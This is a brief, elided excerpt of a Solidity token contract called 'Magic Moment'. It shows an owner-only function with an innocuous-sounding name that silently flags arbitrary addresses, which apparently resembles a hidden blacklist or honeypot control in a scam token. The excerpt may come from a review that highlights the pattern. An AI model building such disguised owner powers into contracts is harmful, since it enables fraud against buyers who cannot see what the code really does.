...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Magic Moment';
    ...
    function MagicMomentDetect(address account) public onlyOwner {
        _besturn[account] = true;
    }

    function MagicMomentStats(address account) public view returns (bool) {
...
contract MagicMoment is BaseToken {
